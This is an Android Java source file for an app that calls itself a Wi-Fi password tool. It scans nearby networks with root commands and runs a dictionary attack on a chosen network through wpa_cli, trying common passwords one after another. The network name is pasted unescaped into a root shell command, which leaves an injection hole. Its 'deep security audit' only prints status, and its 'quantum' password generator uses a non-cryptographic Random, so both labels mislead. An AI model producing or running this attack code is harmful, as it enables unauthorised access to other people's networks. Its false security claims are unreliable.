package com.wifipassword.pro;

import android.os.Bundle;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.ListView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.Random;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class MainActivity extends AppCompatActivity {

    private ListView wifiListView;
    private ArrayList<String> wifiList;
    private ArrayAdapter<String> adapter;
    private String selectedTargetSsid = "Target_Network_SSID";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Button btnWifiConnect = findViewById(R.id.btnWifiConnect);
        Button btnDictionary = findViewById(R.id.btnDictionary);
        Button btnSecurityCheck = findViewById(R.id.btnSecurityCheck);
        Button btnPasswordGen = findViewById(R.id.btnPasswordGen);
        wifiListView = findViewById(R.id.wifiListView);

        wifiList = new ArrayList<>();
        adapter = new ArrayAdapter<>(this, android.R.layout.simple_list_item_1, wifiList);
        wifiListView.setAdapter(adapter);

        wifiListView.setOnItemClickListener((parent, view, position, id) -> {
            String selectedItem = wifiList.get(position);
            selectedTargetSsid = selectedItem;
            Toast.makeText(MainActivity.this, "تم تحديد الشبكة: " + selectedTargetSsid, Toast.LENGTH_SHORT).show();
        });

        btnWifiConnect.setOnClickListener(v -> discoverAndDisplayNetworks());

        btnDictionary.setOnClickListener(v -> {
            if (selectedTargetSsid.equals("Target_Network_SSID")) {
                Toast.makeText(MainActivity.this, "الرجاء اختيار شبكة من القائمة أولاً!", Toast.LENGTH_SHORT).show();
                return;
            }
            executeBruteForceMatrix(selectedTargetSsid);
            Toast.makeText(MainActivity.this, "تم إطلاق مصفوفة الهجوم على: " + selectedTargetSsid, Toast.LENGTH_SHORT).show();
        });

        btnSecurityCheck.setOnClickListener(v -> deepSystemSecurityAudit());
        btnPasswordGen.setOnClickListener(v -> generateQuantumPassword());
    }

    private void discoverAndDisplayNetworks() {
        new Thread(() -> {
            try {
                String scanCommand = "su -c 'iwlist wlan0 scan'";
                Process process = Runtime.getRuntime().exec(scanCommand);
                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                
                String line;
                ArrayList<String> foundNetworks = new ArrayList<>();
                Pattern pattern = Pattern.compile("ESSID:\"([^\"]+)\"");
                
                while ((line = reader.readLine()) != null) {
                    Matcher matcher = pattern.matcher(line);
                    if (matcher.find()) {
                        String ssid = matcher.group(1);
                        if (!ssid.isEmpty() && !foundNetworks.contains(ssid)) {
                            foundNetworks.add(ssid);
                        }
                    }
                }
                process.waitFor();

                runOnUiThread(() -> {
                    wifiList.clear();
                    if (foundNetworks.isEmpty()) {
                        wifiList.add("لا توجد شبكات مرئية أو يلزم تفعيل الواي فاي");
                    } else {
                        wifiList.addAll(foundNetworks);
                    }
                    adapter.notifyDataSetChanged();
                    Toast.makeText(MainActivity.this, "تم تحديث قائمة الشبكات بنجاح", Toast.LENGTH_SHORT).show();
                });

            } catch (Exception e) {
                e.printStackTrace();
                runOnUiThread(() -> Toast.makeText(MainActivity.this, "فشل مسح الشبكات عبر الجذر", Toast.LENGTH_SHORT).show());
            }
        }).start();
    }

    private void executeBruteForceMatrix(String targetSsid) {
        new Thread(() -> {
            String[] eliteDictionary = {
                "12345678", "password", "admin2026", "wifi@2026", 
                "00000000", "11111111", "87654321", "admin123"
            };

            for (String candidatePassword : eliteDictionary) {
                try {
                    String attackCommand = "su -c '" +
                            "NET_ID=$(wpa_cli -i wlan0 add_network | tail -n 1) && " +
                            "wpa_cli -i wlan0 set_network $NET_ID ssid '\"'\"'" + targetSsid + "'\"'\"' && " +
                            "wpa_cli -i wlan0 set_network $NET_ID psk '\"'\"'" + candidatePassword + "'\"'\"' && " +
                            "wpa_cli -i wlan0 enable_network $NET_ID && " +
                            "wpa_cli -i wlan0 save_config" +
                            "'";
                    
                    Process process = Runtime.getRuntime().exec(attackCommand);
                    process.waitFor();
                    
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
            runOnUiThread(() -> Toast.makeText(MainActivity.this, "اكتملت محاولات الهجوم على الشبكة", Toast.LENGTH_LONG).show());
        }).start();
    }

    private void deepSystemSecurityAudit() {
        try {
            String auditCommand = "su -c 'wpa_cli status'";
            Process process = Runtime.getRuntime().exec(auditCommand);
            Toast.makeText(MainActivity.this, "تم إتمام الفحص الجذري الشامل", Toast.LENGTH_LONG).show();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void generateQuantumPassword() {
        String quantumPool = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#$%&*!?";
        StringBuilder securePass = new StringBuilder();
        Random rnd = new Random();
        
        for (int i = 0; i < 16; i++) {
            securePass.append(quantumPool.charAt(rnd.nextInt(quantumPool.length())));
        }
        
        Toast.makeText(MainActivity.this, "الرمز الناتج: " + securePass.toString(), Toast.LENGTH_LONG).show();
    }
}
